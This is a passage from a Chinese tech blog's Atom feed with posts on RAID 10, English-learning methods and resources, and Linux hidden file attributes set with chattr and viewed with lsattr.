10&#x81F3;&#x5C11;&#x9700;&#x8981;4&#x5757;&#x786C;&#x76D8;&#xFF0C;&#x5176;&#x4E2D;&#x5148;&#x5206;&#x522B;&#x5236;&#x4F5C;&#x4E00;&#x5BF9;RAID 1&#xFF0C;&#x4EE5;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;&#x6027;&#xFF1B;&#x7136;&#x540E;&#x518D;&#x4F7F;&#x7528;&#x4E00;&#x5BF9;RAID 0&#x521B;&#x5EFA;RAID 0&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x9AD8;&#x8BBE;&#x5907;&#x7684;&#x8BFB;&#x5199;&#x901F;&#x5EA6;&#x3002;</p><p>&#x7406;&#x8BBA;&#x4E0A;&#x6765;&#x8BB2;&#xFF0C;&#x53EA;&#x8981;&#x574F;&#x7684;&#x4E0D;&#x662F;&#x540C;&#x4E00;&#x7EC4;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x786C;&#x76D8;&#xFF0C;&#x90A3;&#x4E48;&#x6700;&#x591A;&#x53EF;&#x4EE5;&#x635F;&#x574F;50%&#x7684;&#x8BBE;&#x5907;&#x800C;&#x4E0D;&#x4E22;&#x5931;&#x6570;&#x636E;&#x3002;&#x7531;&#x4E8E;RAID 10&#x7EE7;&#x627F;&#x4E86;RAID 0&#x7684;&#x9AD8;&#x901F;&#x8BFB;&#x5199;&#x548C;RAID 1&#x7684;&#x6570;&#x636E;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x5728;&#x4E0D;&#x8003;&#x8651;&#x6210;&#x672C;&#x7684;&#x60C5;&#x51B5;&#x4E0B;RAID 10&#x7684;&#x6027;&#x80FD;&#x90FD;&#x8D85;&#x8FC7;&#x4E86;RAID 5&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      RAID(独立冗余磁盘阵列)技术介绍
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="磁盘阵列" scheme="https://marnm.github.io/tags/%E7%A3%81%E7%9B%98%E9%98%B5%E5%88%97/"/>
    
      <category term="RAID 0" scheme="https://marnm.github.io/tags/RAID-0/"/>
    
      <category term="RAID 1" scheme="https://marnm.github.io/tags/RAID-1/"/>
    
      <category term="RAID 5" scheme="https://marnm.github.io/tags/RAID-5/"/>
    
      <category term="RAID 10" scheme="https://marnm.github.io/tags/RAID-10/"/>
    
  </entry>
  
  <entry>
    <title>我学练英语所使用的方法、工具与资料</title>
    <link href="https://marnm.github.io//posts/9bf5b5/"/>
    <id>https://marnm.github.io//posts/9bf5b5/</id>
    <published>2018-08-23T15:55:04.000Z</published>
    <updated>2018-10-03T17:35:40.222Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://dramatea.github.io/077%20%E6%88%91%E5%AD%A6%E7%BB%83%E8%8B%B1%E8%AF%AD%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7%E4%B8%8E%E8%B5%84%E6%96%99.html" target="_blank" rel="noopener">&#x539F;&#x6587;&#xFF1A;dramatea</a></p></blockquote><p><strong>&#x8BD5;&#x7528;&#x8FC7;&#x7684;&#x65B9;&#x6CD5;&#xFF08;&#x6309;&#x8FDB;&#x5C55;&#x7684;&#x65F6;&#x95F4;&#x987A;&#x5E8F;&#xFF09;</strong><br>&#x521D;&#x4E2D;&#x9AD8;&#x4E2D;&#x5927;&#x5B66;&#x7684;&#x82F1;&#x8BED;&#x8BFE;&#x5802;&#x4E0E;&#x8003;&#x8BD5;<br>&#x3010;&#x4E0D;&#x5F97;&#x4E0D;&#x627F;&#x8BA4;&#x6211;&#x90A3;&#x53EF;&#x601C;&#x7684;&#x8BED;&#x6CD5;&#x77E5;&#x8BC6;&#x548C;&#x5927;&#x591A;&#x6570;&#x5355;&#x8BCD;&#x90FD;&#x662F;&#x5728;&#x8FD9;&#x4E2A;&#x9636;&#x6BB5;&#x638C;&#x63E1;&#x7684;<br><a id="more"></a><br>&#x4F7F;&#x7528;&#x80CC;&#x5355;&#x8BCD;&#x5DE5;&#x5177;&#xFF0C;&#x6309;&#x7167;&#x8BB0;&#x5FC6;&#x66F2;&#x7EBF;&#x6BCF;&#x65E5;&#x6B7B;&#x8BB0;&#x786C;&#x80CC;&#x65B0;&#x8BCD;&#x6216;&#x590D;&#x4E60;&#x65E7;&#x8BCD;<br>&#xFF08;&#x6247;&#x8D1D;&#x6253;&#x5361;&#x8BB0;&#x5F55;&#xFF1A;<a href="http://www.shanbay.com/checkin/user/920425/" target="_blank" rel="noopener">http://www.shanbay.com/checkin/user/920425/</a><br>&#x3010;&#x5BF9;&#x4E8E;&#x6211;&#x8FD9;&#x79CD;&#x8BB0;&#x6027;&#x5DEE;&#x7684;&#x4EBA;&#x6B64;&#x6CD5;&#x6548;&#x679C;&#x5F88;&#x4E00;&#x822C;&#x3002;&#x575A;&#x6301;&#x6253;&#x5361;370&#x5929;&#x540E;&#x505C;&#x6B62;&#x4F7F;&#x7528;&#x6247;&#x8D1D;&#x3002;&#x4F46;&#x6362;&#x4E86;&#x4E2A;&#x767E;&#x8BCD;&#x65A9;&#x5076;&#x5C14;&#x518D;&#x80CC;&#x80CC;&#x5355;&#x8BCD;<br>&#x5976;&#x7238;&#x82F1;&#x8BED;&#x6559;&#x5BA4;&#x4E2D;&#x7EA7; <a href="http://t.cn/zjSMhMC" target="_blank" rel="noopener">http://t.cn/zjSMhMC</a><br>easy VOA <a href="http://www.easyvoa.com/" target="_blank" rel="noopener">http://www.easyvoa.com/</a> &#xFF08;&#x7F8E;&#x56FD;&#x4E4B;&#x97F3;&#xFF0C;&#x6D4B;&#x8BD5;&#x81EA;&#x5DF1;&#x662F;&#x5426;&#x542C;&#x61C2;&#xFF0C;&#x5224;&#x65AD;&#x7EA7;&#x522B;<br>&#xFF08;&#x8BFB;&#x8BB0;&#x2014;&#x2014;&#x6076;&#x9B54;&#x5976;&#x7238;&#x7684;&#x82F1;&#x8BED;&#x5B66;&#x4E60;&#x65B9;&#x6CD5; <a href="http://dramatea.com/a/397" target="_blank" rel="noopener">http://dramatea.com/a/397</a><br>&#x3010;&#x5B8C;&#x6210;&#x4E86;&#x7B2C;&#x4E00;&#x6B65;&#x9AA4;&#xFF0C;&#x53D1;&#x97F3;&#x7684;&#x7EA0;&#x6B63;&#x3002;&#x540E;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x60C5;&#x51B5;&#x8C03;&#x6574;&#x540E;&#x7EED;&#x65B9;&#x6CD5;<br>&#x5728;&#x5E94;&#x7528;&#x4E2D;&#x7EC3;&#x4E60;&#xFF08;&#x7EC3;&#x82F1;&#x8BED;&#x957F;&#x77E5;&#x8BC6;&#x4E24;&#x4E0D;&#x8BEF;<br>&#x2460;&#x76F4;&#x63A5;&#x53BB;&#x9605;&#x8BFB;&#x82F1;&#x6587;&#x7684;&#x6587;&#x7AE0;&#x548C;&#x4E66;&#x7C4D;&#xFF0C;&#x4E0D;&#x8BA4;&#x8BC6;&#x7684;&#x5355;&#x8BCD;&#x67E5;&#x8BCD;&#x5178;&#xFF1B;<br>&#x2461;&#x91CD;&#x590D;&#x770B;/&#x542C;&#x82F1;&#x8BED;&#x89C6;&#x9891;&#xFF08;&#x5E26;&#x4E2D;&#x82F1;&#x5B57;&#x5E55;&#xFF09;&#xFF1B;<br>&#xFF08;&#x9700;&#x8981;&#x53D1;&#x97F3;&#x3001;&#x8BCD;&#x6C47;&#x91CF;&#x3001;&#x8BED;&#x6CD5;&#x6709;&#x90A3;&#x4E48;&#x70B9;&#x57FA;&#x7840;<br>&#x3010;&#x4E2D;&#x9636;ing&#x2026;</p><p><strong>&#x53D1;&#x97F3;</strong><br>&#x7EC3;&#x4E60;&#x97F3;&#x6807;&#x53D1;&#x97F3;&#x7684;&#x6559;&#x7A0B;&#x89C6;&#x9891;&#x548C;flash&#x4EC0;&#x4E48;&#x7684;&#xFF08;&#x597D;&#x65E9;&#x524D;&#x7528;&#x8FC7;&#xFF0C;&#x627E;&#x4E0D;&#x5230;&#x4E86;<br>&#x8D56;&#x4E16;&#x96C4;&#x7F8E;&#x8BED;&#x97F3;&#x6807; <a href="http://t.cn/zRtwZA7" target="_blank" rel="noopener">http://t.cn/zRtwZA7</a> &#xFF08;&#x8DDF;&#x7740;&#x8D56;&#x8001;&#x5E08;&#x7684;&#x8BFE;&#x7A0B;&#x7EC3;&#x4E60;&#x53D1;&#x97F3;&#x5C31;&#x597D;</p><p><strong>&#x8BCD;&#x6C47;</strong><br>Test Your Vocab <a href="http://testyourvocab.com&#xFF08;&#x8BCD;&#x6C47;&#x91CF;&#x6D4B;&#x8BD5;" target="_blank" rel="noopener">http://testyourvocab.com&#xFF08;&#x8BCD;&#x6C47;&#x91CF;&#x6D4B;&#x8BD5;</a><br>&#x6D77;&#x8BCD; <a href="http://dict.cn/&#xFF08;&#x8BCD;&#x5178;&#xFF0C;&#x5E38;&#x7528;&#xFF0C;&#x6C49;&#x2192;&#x82F1;&#xFF0C;&#x82F1;&#x2192;&#x6C49;" target="_blank" rel="noopener">http://dict.cn/&#xFF08;&#x8BCD;&#x5178;&#xFF0C;&#x5E38;&#x7528;&#xFF0C;&#x6C49;&#x2192;&#x82F1;&#xFF0C;&#x82F1;&#x2192;&#x6C49;</a><br>&#x6247;&#x8D1D;&#x7F51; <a href="http://shanbay.com" target="_blank" rel="noopener">http://shanbay.com</a> &#xFF08;&#x80CC;&#x5355;&#x8BCD;/&#x9605;&#x8BFB;/&#x5C0F;&#x7EC4;&#x5185;&#x4E92;&#x76F8;&#x6FC0;&#x52B1;<br>&#x767E;&#x8BCD;&#x65A9; <a href="http://www.baicizhan.com" target="_blank" rel="noopener">http://www.baicizhan.com</a> &#xFF08;&#x80CC;&#x5355;&#x8BCD;&#xFF0C;&#x73B0;&#x7528;</p><p>&#x5206;&#x4EAB;&#x81EA;&#x5236;&#x7684;&#x82F1;&#x8BED;&#x8BCD;&#x6C47;&#x8868;&#xFF1A;<br>&#x4E54;&#x5E03;&#x65AF;2005&#x5E74;&#x5728;&#x65AF;&#x5766;&#x798F;&#x5927;&#x5B66;&#x7684;&#x6F14;&#x8BB2;&#xFF08;224&#x8BCD;&#xFF09; <a href="http://www.shanbay.com/wordbook/5119/" target="_blank" rel="noopener">&#x6247;&#x8D1D;&#x5355;&#x8BCD;&#x4E66;</a> / <a href="http://www.tudou.com/programs/view/Cerx7xz2DzA/" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x89C6;&#x9891;(&#x4E2D;&#x82F1;&#x5B57;&#x5E55;)</a><br>TED&#xFF1A;Ernesto Sirolli &#x2013; &#x60F3;&#x8981;&#x5E2E;&#x52A9;&#x522B;&#x4EBA;&#xFF1F;&#x95ED;&#x5634;&#xFF0C;&#x542C;&#x4EBA;&#x5BB6;&#x8BF4;&#xFF01;&#xFF08;546&#x8BCD;&#xFF09;<a href="http://www.shanbay.com/wordbook/6874/" target="_blank" rel="noopener">&#x6247;&#x8D1D;&#x5355;&#x8BCD;&#x4E66;</a> / <a href="http://www.ted.com/talks/ernesto_sirolli_want_to_help_someone_shut_up_and_listen.html" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x89C6;&#x9891;</a><br>&#x7535;&#x5F71;&#x300A;Hotel Transylvania&#x300B;(1542&#x8BCD;) <a href="http://pan.baidu.com/share/link?shareid=264482&amp;uk=304925281" target="_blank" rel="noopener">&#x5B8C;&#x6574;&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D;</a> / <a href="http://www.shanbay.com/wordbook/6088/" target="_blank" rel="noopener">&#x6247;&#x8D1D;&#x8BCD;&#x4E32;</a> / <a href="http://open.sina.com.cn/course/id_322/lesson_4399/" target="_blank" rel="noopener">&#x7535;&#x5F71;&#x4ECB;&#x7ECD;</a><br>&#x8036;&#x9C81;&#x516C;&#x5F00;&#x8BFE;&#xFF1A;&#x7F8E;&#x56FD;&#x73B0;&#x4EE3;&#x4E3B;&#x4E49;&#x6587;&#x5B66;&#x9009;&#x8BFB; &#x7B2C;&#x4E09;&#x8BFE;(1257&#x8BCD;) <a href="http://pan.baidu.com/share/link?shareid=264482&amp;uk=304925281" target="_blank" rel="noopener">&#x5B8C;&#x6574;&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D;</a> / <a href="http://open.sina.com.cn/course/id_322/lesson_4399/" target="_blank" rel="noopener">&#x8BFE;&#x7A0B;&#x89C6;&#x9891;</a></p><p><strong>&#x8BED;&#x6CD5;</strong><br>&#x4E0A;&#x5B66;&#x65F6;&#x7684;&#x82F1;&#x8BED;&#x8001;&#x5E08;&#x4EEC;&#x7684;&#x558B;&#x558B;&#x4E0D;&#x4F11;&#x8F9B;&#x52E4;&#x4F20;&#x6388;<br>&#x8BED;&#x6CD5;&#x4E66;</p><p><strong>&#x9605;&#x8BFB;</strong><br><a href="http://book.douban.com/subject/1370897/" target="_blank" rel="noopener">The Little Prince</a> &#xFF08;&#x597D;&#x8BFB;&#x3001;&#x6709;&#x8DA3;&#x3001;&#x4E66;&#x4E0D;&#x539A;<br>&#x6211;&#x7684;&#x9605;&#x8BFB;&#x65B9;&#x6CD5;&#x662F;&#xFF0C;&#x4E00;&#x6B21;&#x8BFB;&#x4E00;&#x7AE0;&#x8282;&#xFF0C;&#x4E0D;&#x61C2;&#x7684;&#x5355;&#x8BCD;&#x67E5;&#x5B57;&#x5178;&#x5E76;&#x6807;&#x8BB0;&#xFF08;Kindle&#x4E0A;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#xFF09;&#xFF1B;&#x8BFB;&#x5B8C;&#x672C;&#x7AE0;&#x8282;&#x540E;&#x56DE;&#x987E;&#x6807;&#x8BB0;&#x7684;&#x5355;&#x8BCD;&#xFF1B;&#x7B2C;&#x4E8C;&#x5929;&#x5148;&#x56DE;&#x987E;&#x6628;&#x65E5;&#x6807;&#x8BB0;&#x5355;&#x8BCD;&#xFF0C;&#x518D;&#x590D;&#x770B;&#x6628;&#x65E5;&#x7AE0;&#x8282;&#xFF1B;&#x7136;&#x540E;&#x7EE7;&#x7EED;&#x9605;&#x8BFB;&#x4E0B;&#x4E00;&#x7AE0;&#x8282;&#xFF1B;&#x5982;&#x6B64;&#x65B9;&#x5F0F;&#x6301;&#x7EED;&#x8BFB;&#x5B8C;&#x3002;</p><p><strong>&#x89C6;&#x542C;</strong><br>TED <a href="http://www.ted.com/talks" target="_blank" rel="noopener">http://www.ted.com/talks</a> &#xFF08;&#x4E30;&#x5BCC;&#x4F18;&#x8D28;&#x7684;&#x6F14;&#x8BB2;&#x89C6;&#x9891;&#xFF0C;&#x6709;&#x591A;&#x56FD;&#x8BED;&#x8A00;&#x5B57;&#x5E55;</p><p>&#x53F2;&#x8482;&#x592B;&#xB7;&#x4E54;&#x5E03;&#x65AF;2005&#x5E74;6&#x6708;&#x5728;&#x65AF;&#x5766;&#x798F;&#x5927;&#x5B66;&#x6BD5;&#x4E1A;&#x5178;&#x793C;&#x4E0A;&#x7684;&#x6F14;&#x8BB2;<br><a href="http://pan.baidu.com/share/link?shareid=203002&amp;uk=304925281" target="_blank" rel="noopener">&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D;</a> / <a href="http://pan.baidu.com/share/link?shareid=203000&amp;uk=304925281" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x6587;&#x672C;(&#x82F1;&#x6587;+&#x4E2D;&#x6587;)&#x4E0B;&#x8F7D;</a> / <a href="http://www.tudou.com/programs/view/Cerx7xz2DzA/" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x89C6;&#x9891;(&#x4E2D;&#x82F1;&#x5B57;&#x5E55;)</a> / <a href="http://pan.baidu.com/share/link?shareid=202986&amp;uk=304925281" target="_blank" rel="noopener">&#x6F14;&#x8BB2;&#x97F3;&#x9891;</a></p><p>Joe Wang&#x2019;s Talk Show on the Late Show<br><a href="http://pan.baidu.com/share/link?shareid=210010&amp;uk=304925281" target="_blank" rel="noopener">&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D;</a> / <a href="http://www.tudou.com/listplay/AHMzWWhLE5M/Vg3YjDjeE5E.html" target="_blank" rel="noopener">&#x8131;&#x53E3;&#x79C0;&#x89C6;&#x9891;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://dramatea.github.io/077%20%E6%88%91%E5%AD%A6%E7%BB%83%E8%8B%B1%E8%AF%AD%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7%E4%B8%8E%E8%B5%84%E6%96%99.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文：dramatea&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;试用过的方法（按进展的时间顺序）&lt;/strong&gt;&lt;br&gt;初中高中大学的英语课堂与考试&lt;br&gt;【不得不承认我那可怜的语法知识和大多数单词都是在这个阶段掌握的&lt;br&gt;
    
    </summary>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
      <category term="学习" scheme="https://marnm.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件的隐藏属性</title>
    <link href="https://marnm.github.io//posts/cc999d74/"/>
    <id>https://marnm.github.io//posts/cc999d74/</id>
    <published>2018-08-20T08:46:44.000Z</published>
    <updated>2020-04-09T11:50:09.017Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#xA0;&#xA0;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x9664;&#x4E86;&#x5177;&#x5907;&#x4E00;&#x822C;&#x6743;&#x9650;&#x548C;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x79CD;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x5373;&#x88AB;&#x9690;&#x85CF;&#x8D77;&#x6765;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x88AB;&#x7528;&#x6237;&#x53D1;&#x89C9;&#x3002;&#x6709;&#x7528;&#x6237;&#x66FE;&#x7ECF;&#x5728;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x548C;RHCE&#x8003;&#x8BD5;&#x9898;&#x76EE;&#x4E2D;&#x78B0;&#x5230;&#x8FC7;&#x660E;&#x660E;&#x6743;&#x9650;&#x5145;&#x8DB3;&#x4F46;&#x5374;&#x65E0;&#x6CD5;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6216;&#x8005;&#x4EC5;&#x80FD;&#x5728;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x4E2D;&#x8FFD;&#x52A0;&#x5185;&#x5BB9;&#x800C;&#x4E0D;&#x80FD;&#x4FEE;&#x6539;&#x6216;&#x5220;&#x9664;&#x5185;&#x5BB9;&#xFF0C;&#x8FD9;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x963B;&#x6B62;&#x4E86;&#x9ED1;&#x5BA2;&#x7BE1;&#x6539;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x7684;&#x56FE;&#x8C0B;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x79CD;&#x201C;&#x5947;&#x602A;&#x201D;&#x7684;&#x6587;&#x4EF6;&#x4E5F;&#x4FDD;&#x969C;&#x4E86;Linux&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;<br><a id="more"></a></p><h2 id="chattr-&#x547D;&#x4EE4;"><a href="#chattr-&#x547D;&#x4EE4;" class="headerlink" title="chattr &#x547D;&#x4EE4;"></a>chattr &#x547D;&#x4EE4;</h2><p>&#xA0;&#xA0;&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;chattr [&#x53C2;&#x6570;] &#x6587;&#x4EF6;&#x201D;&#x3002;&#x5982;&#x679C;&#x60F3;&#x8981;&#x628A;&#x67D0;&#x4E2A;&#x9690;&#x85CF;&#x529F;&#x80FD;&#x6DFB;&#x52A0;&#x5230;&#x6587;&#x4EF6;&#x4E0A;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x5728;&#x547D;&#x4EE4;&#x540E;&#x9762;&#x8FFD;&#x52A0;&#x201D;+&#x53C2;&#x6570;&#x201D;,&#x5982;&#x679C;&#x60F3;&#x8981;&#x628A;&#x67D0;&#x4E2A;&#x9690;&#x85CF;&#x529F;&#x80FD;&#x79FB;&#x51FA;&#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x8FFD;&#x52A0;&#x201D;-&#x53C2;&#x6570;&#x201D;&#x3002;</p><table><thead><tr><th>&#x53C2;&#x6570;</th><th>&#x4F5C;&#x7528;</th><th>&#x53C2;&#x6570;</th><th style="text-align:center">&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>i</td><td>&#x65E0;&#x6CD5;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF1B;&#x82E5;&#x5BF9;&#x76EE;&#x5F55;&#x8BBE;&#x7F6E;&#x4E86;&#x8BE5;&#x53C2;&#x6570;&#xFF0C;&#x5219;&#x4EC5;&#x80FD;&#x5C31;&#x4FEE;&#x6539;&#x5176;&#x4E2D;&#x7684;&#x5B50;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x65B0;&#x5EFA;&#x6216;&#x5220;&#x9664;&#x6587;&#x4EF6;</td><td>a</td><td style="text-align:center">&#x4EC5;&#x5141;&#x8BB8;&#x8865;&#x5145;&#xFF08;&#x8FFD;&#x52A0;&#xFF09;&#x5185;&#x5BB9;&#xFF0C;&#x65E0;&#x6CD5;&#x8986;&#x76D6;/&#x5220;&#x9664;&#x5185;&#x5BB9;(Append Only)</td></tr><tr><td>S</td><td>&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5728;&#x53D8;&#x66F4;&#x540E;&#x7ACB;&#x5373;&#x540C;&#x6B65;&#x5230;&#x786C;&#x76D8;(sync)</td><td>s</td><td style="text-align:center">&#x5F7B;&#x5E95;&#x4ECE;&#x786C;&#x76D8;&#x4E2D;&#x5220;&#x9664;&#xFF0C;&#x4E0D;&#x53EF;&#x6062;&#x590D;&#xFF08;&#x7528;0&#x586B;&#x5145;&#x539F;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x786C;&#x76D8;&#x533A;&#x57DF;</td></tr><tr><td>A</td><td>&#x4E0D;&#x518D;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x6700;&#x540E;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;(atime)</td><td>b</td><td style="text-align:center">&#x4E0D;&#x518D;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x5B58;&#x53D6;&#x65F6;&#x95F4;</td></tr><tr><td>D</td><td>&#x68C0;&#x67E5;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x9519;&#x8BEF;</td><td>d</td><td style="text-align:center">&#x4F7F;&#x7528;dump&#x547D;&#x4EE4;&#x5907;&#x4EFD;&#x662F;&#x5FFD;&#x7565;&#x672C;&#x6587;&#x4EF6;/&#x76EE;&#x5F55;</td></tr><tr><td>c</td><td>&#x9ED8;&#x8BA4;&#x5C06;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x538B;&#x7F29;</td><td>u</td><td style="text-align:center">&#x5F53;&#x5220;&#x9664;&#x8BE5;&#x6587;&#x4EF6;&#x540E;&#x4F9D;&#x7136;&#x4FDD;&#x7559;&#x5176;&#x5728;&#x786C;&#x76D8;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x65B9;&#x4FBF;&#x65E5;&#x540E;&#x6062;&#x590D;</td></tr><tr><td>t</td><td>&#x8BA9;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x652F;&#x6301;&#x5C3E;&#x90E8;&#x5408;&#x5E76;(tail-merging)</td><td>x</td><td style="text-align:center">&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5185;&#x5BB9;</td></tr></tbody></table><h2 id="lsattr-&#x547D;&#x4EE4;"><a href="#lsattr-&#x547D;&#x4EE4;" class="headerlink" title="lsattr &#x547D;&#x4EE4;"></a>lsattr &#x547D;&#x4EE4;</h2><p>&#xA0;&#xA0;<code>lsattr</code>&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x663E;&#x793A;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;<code>lsattr [&#x53C2;&#x6570;] &#x6587;&#x4EF6;</code>&#x3002;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x4E2A;&#xFF0C;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#x5FC5;&#x987B;&#x4F7F;&#x7528;<code>lsattr</code>&#x547D;&#x4EE4;&#x67E5;&#x770B;&#xFF0C;&#x5E73;&#x65F6;&#x4F7F;&#x7528;<code>ls</code>&#x4E4B;&#x7C7B;&#x7684;&#x547D;&#x4EE4;&#x5219;&#x770B;&#x4E0D;&#x51FA;&#x6765;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;Linux系统中的文件除了具备一般权限和特殊权限之外，还有一种隐藏权限，即被隐藏起来的权限，默认情况下不能直接被用户发觉。有用户曾经在生产环境和RHCE考试题目中碰到过明明权限充足但却无法删除某个文件的情况，或者仅能在日志文件中追加内容而不能修改或删除内容，这在一定程度上阻止了黑客篡改系统日志的图谋，因此这种“奇怪”的文件也保障了Linux系统的安全性。&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="chattr命令" scheme="https://marnm.github.io/tags/chattr%E5%91%BD%E4%BB%A4/"/>
    
      <category term="lsattr命令" scheme="https://marnm.github.io/tags/lsattr%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件的特殊权限</title>
    <link href="https://marnm.github.io//posts/a9bb0c1a/"/>
    <id>https://marnm.github.io//posts/a9bb0c1a/</id>
    <published>2018-08-19T15:05:06.000Z</published>
    <updated>2020-04-09T11:50:09.020Z</updated>
    
